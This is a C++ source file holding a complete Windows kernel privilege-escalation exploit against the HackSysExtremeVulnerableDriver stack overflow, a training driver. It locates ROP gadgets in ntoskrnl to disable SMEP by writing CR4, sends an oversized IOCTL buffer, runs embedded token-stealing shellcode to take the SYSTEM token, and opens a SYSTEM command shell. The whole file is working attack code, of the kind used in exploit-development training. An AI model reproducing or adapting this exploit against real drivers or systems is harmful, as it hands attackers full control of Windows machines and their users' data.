
#include <iostream>
#include <windows.h>
#include <Psapi.h>
#include <map>
#include <vector>
#include <algorithm>

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK 0x222003

typedef unsigned __int64 QWORD;

std::map<std::string, std::vector<BYTE >> ops = {
    { "POP_RCX", { 0x59, 0xc3 }},
    { "MOV_CR4_RCX", { 0x0f, 0x22, 0xe1, 0xc3 }},
};

std::map<std::string, DWORD> gadgets = {};

QWORD FindGadget(HMODULE moduleName, BYTE* opCodeArray, int opCodeSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleName;
    PIMAGE_NT_HEADERS ntHeader;
    ntHeader = (PIMAGE_NT_HEADERS)((ULONGLONG)(dosHeader)+(dosHeader->e_lfanew));
    IMAGE_OPTIONAL_HEADER opHeader;
    opHeader = ntHeader->OptionalHeader;

    BYTE* ntoskrnlBuf = NULL;
    ntoskrnlBuf = (BYTE*)malloc(opHeader.SizeOfCode);
    if (ntoskrnlBuf == NULL) {
        std::cout << "failed ntoskrnbuf malloc";
        exit(0);
    }
    SIZE_T sizeRead;
    ReadProcessMemory(GetCurrentProcess(), moduleName, ntoskrnlBuf, opHeader.SizeOfCode, &sizeRead);

    BYTE* buf = ntoskrnlBuf;
    PBYTE bufLast = buf + opHeader.SizeOfCode;
    BYTE* pattern = opCodeArray;
    PBYTE patternLast = pattern + opCodeSize;
    // std::search would search from start, however at start more gadgets are non paged in the kernel
    PBYTE occurence = std::find_end(buf, bufLast, pattern, patternLast); // returns iterator to first occurence of sequence

    BOOL found = (occurence != bufLast);

    if (found)
    {
        return std::distance(buf, occurence);
    }
    else
    {
        return -1;
    }
}

void GetGadgets() {
    HMODULE lpFileName = LoadLibrary(L"C:\\Windows\\System32\\ntoskrnl.exe");
    for (std::map<std::string, std::vector<BYTE>>::iterator iter = ops.begin(); iter != ops.end(); ++iter)
    {
        std::string k = iter->first;
        unsigned char* v = (unsigned char*)&iter->second[0];
        QWORD gadgetOffset = FindGadget(lpFileName, v, (SIZE_T)iter->second.size());
        gadgets[k] = gadgetOffset;
    }
}

char sc[] = "\xB9\xFF\xFF\xFF\xFF\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x8D\x80\xF0\x02\x00\x00\x48\x8B\x00\x48\x8B\x58\xF8\x48\x83\xFB\x04\x75\xF3\x48\x8B\x58\x68\x53\x48\x8B\x00\x48\x8B\x58\xF8\x39\xCB\x75\xF5\x5B\x48\x89\x58\x68\x48\x31\xC0\x48\x83\xC4\x28\xC3";
//36

ULONGLONG getBaseAddr(LPCWSTR drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        WCHAR szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (wcscmp(szDrivers, drvname) == 0)
                {
                    return (ULONGLONG)drivers[i];
                }
            }
        }
    }
    return 0;
}

union {
    DWORD pidI;
    BYTE pidC[4];
} pid;

int main()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "error opening device" << std::endl;
        exit(0);
    }

    GetGadgets();

    LPVOID privescPtr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (privescPtr) {
        RtlCopyMemory(privescPtr, sc, sizeof(sc));
        pid.pidI = GetCurrentProcessId();
        *(DWORD*)((QWORD)privescPtr + 1) = pid.pidI;
    }

    else {
        std::cout << "failed allocating space for shellcode" << std::endl;
        exit(0);
    }

    ULONGLONG kernelBase = NULL;
    kernelBase = getBaseAddr(L"ntoskrnl.exe");
    if (!kernelBase) {
        std::cout << "error getting base addr of nt" << std::endl;
        exit(0);
    }

    DWORD dwIoControlCode = HEVD_IOCTL_BUFFER_OVERFLOW_STACK;

    int offset = 2072;
    BYTE uBuf[2104] = { 0 };
    int index = 0;

    memset(uBuf, 0x41, sizeof(uBuf));

    QWORD* rop = (QWORD*)(uBuf + offset);
    *(rop + index++) = kernelBase + gadgets["POP_RCX"];
    *(rop + index++) = 0x230678;
    *(rop + index++) = kernelBase + gadgets["MOV_CR4_RCX"];
    *(rop + index++) = (QWORD)privescPtr;

    if (!DeviceIoControl(hDevice, dwIoControlCode, (LPVOID)&uBuf, sizeof(uBuf), NULL, 0, NULL, 0)) {
        std::cout << "error during ioctl" << std::endl;
        std::cout << "error code: " << GetLastError() << std::endl;
        exit(0);
    }

    CloseHandle(hDevice);
    VirtualFree(privescPtr, 0, MEM_RELEASE);

    std::cout << "you are now SYSTEM" << std::endl;
    system("cmd.exe");

    exit(1);
}
